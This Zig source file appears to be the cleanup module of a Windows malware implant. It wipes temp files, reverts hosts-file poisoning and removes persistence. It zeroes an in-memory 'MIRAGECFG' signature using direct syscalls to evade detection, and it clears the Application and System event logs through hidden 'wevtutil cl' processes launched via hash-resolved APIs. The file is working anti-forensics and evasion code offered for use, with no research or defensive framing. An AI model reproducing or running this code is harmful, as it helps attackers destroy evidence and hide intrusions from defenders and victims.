const std = @import("std");
const types = @import("../types/types.zig");
const engine = @import("../syscalls/engine.zig");
const hash = @import("../types/hash.zig");
const peb_walk = @import("../types/peb_walk.zig");
const export_resolve = @import("../types/export_resolve.zig");
const hosts_poison = @import("../evasion/hosts_poison.zig");
const persistence = @import("persistence.zig");
const temp_wipe = @import("temp_wipe.zig");

pub const CleanupResult = enum(u32) {
    Success = 0,
    Partial = 1,
    Failed = 2,
};

pub fn cleanup(allocator: std.mem.Allocator) CleanupResult {
    var ok: u32 = 0;
    var total: u32 = 0;

    total += 1;
    temp_wipe.wipeTempDirectory(allocator);
    ok += 1;

    total += 1;
    hosts_poison.clean();
    ok += 1;

    total += 1;
    if (persistence.uninstall() == .Success)
        ok += 1;

    total += 1;
    if (removeDetectionSignatures())
        ok += 1;

    total += 1;
    if (clearEventLogs())
        ok += 1;

    if (ok == total) return .Success;
    if (ok > 0) return .Partial;
    return .Failed;
}

pub fn removeDetectionSignatures() bool {
    const peb = peb_walk.getPeb();
    const base = @as([*]u8, @ptrCast(peb.ImageBaseAddress));
    const dos = @as(*types.IMAGE_DOS_HEADER, @ptrCast(base));
    if (dos.e_magic != types.IMAGE_DOS_SIGNATURE) return false;

    const nt = @as(*types.IMAGE_NT_HEADERS64, @ptrCast(@alignCast(@as(*anyopaque, @ptrCast(base + @as(usize, @intCast(dos.e_lfanew)))))));
    if (nt.Signature != types.IMAGE_NT_SIGNATURE) return false;

    const section_headers = @as([*]types.IMAGE_SECTION_HEADER, @ptrCast(@as(*align(1) types.IMAGE_SECTION_HEADER, @ptrFromInt(@intFromPtr(nt) + @sizeOf(types.IMAGE_NT_HEADERS64) - @sizeOf(types.IMAGE_OPTIONAL_HEADER64) + nt.FileHeader.SizeOfOptionalHeader))));

    const marker = "MIRAGECFG";
    for (0..nt.FileHeader.NumberOfSections) |i| {
        const s = &section_headers[i];
        const va = s.VirtualAddress;
        const vs = s.Misc.VirtualSize;
        if (va == 0 or vs == 0) continue;

        const section_data = base[@as(usize, @intCast(va))..][0..@as(usize, @intCast(vs))];
        if (std.mem.indexOf(u8, section_data, marker)) |offset| {
            const target = @as(*anyopaque, @ptrFromInt(@intFromPtr(base) + va + @as(usize, @intCast(offset))));
            var prot_base: ?types.PVOID = target;
            var prot_size: types.SIZE_T = marker.len;
            var old_prot: types.ULONG = 0;
            if (engine.NtProtectVirtualMemory(
                @as(types.HANDLE, @ptrFromInt(~@as(usize, 0))),
                @as(*types.PVOID, @ptrCast(&prot_base)),
                &prot_size,
                types.PAGE_READWRITE,
                &old_prot,
            ) < 0) return false;

            var bytes_written: types.SIZE_T = 0;
            const zeros = [_]u8{ 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 };
            const write_ok = engine.NtWriteVirtualMemory(
                @as(types.HANDLE, @ptrFromInt(~@as(usize, 0))),
                target,
                @as(types.PVOID, @constCast(&zeros)),
                @as(types.ULONG, @intCast(marker.len)),
                &bytes_written,
            );

            prot_base = target;
            prot_size = marker.len;
            _ = engine.NtProtectVirtualMemory(
                @as(types.HANDLE, @ptrFromInt(~@as(usize, 0))),
                @as(*types.PVOID, @ptrCast(&prot_base)),
                &prot_size,
                old_prot,
                &old_prot,
            );
            return write_ok >= 0 and bytes_written == marker.len;
        }
    }
    return false;
}

pub fn clearEventLogs() bool {
    const kernel32 = peb_walk.getModuleByHash(hash.encryptedHashModule("kernel32.dll")) orelse return false;
    const create_proc = export_resolve.getFunctionByHash(kernel32, hash.encryptedHashFunc("CreateProcessW")) orelse return false;
    const CreateProcessW: *const fn (app: ?[*:0]const u16, cmd: ?[*:0]u16, pa: ?*const anyopaque, ta: ?*const anyopaque, ih: types.BOOL, flags: u32, env: ?*const anyopaque, dir: ?[*:0]const u16, si: *const anyopaque, pi: *anyopaque) callconv(.winapi) types.BOOL = @ptrCast(@alignCast(create_proc));

    const logs = [_][]const u8{ "Application", "System" };
    var any_ok = false;
    for (logs) |log_name| {
        var cmd_buf: [260]u16 = undefined;
        const prefix = "wevtutil cl ";
        var pos: usize = 0;
        for (prefix) |c| {
            cmd_buf[pos] = c;
            pos += 1;
        }
        for (log_name) |c| {
            cmd_buf[pos] = c;
            pos += 1;
        }
        cmd_buf[pos] = 0;

        var si: [68]u8 = undefined;
        @memset(&si, 0);
        var pi: [16]u8 = undefined;
        @memset(&pi, 0);

        if (CreateProcessW(null, @ptrCast(&cmd_buf), null, null, 0, 0x08000000, null, null, @ptrCast(&si), @ptrCast(&pi)) != 0) {
            any_ok = true;
        }
    }
    return any_ok;
}

test "cleanup returns result" {
    _ = cleanup(std.testing.allocator);
}

test "removeDetectionSignatures no crash" {
    _ = removeDetectionSignatures();
}

test "clearEventLogs no crash" {
    _ = clearEventLogs();
}
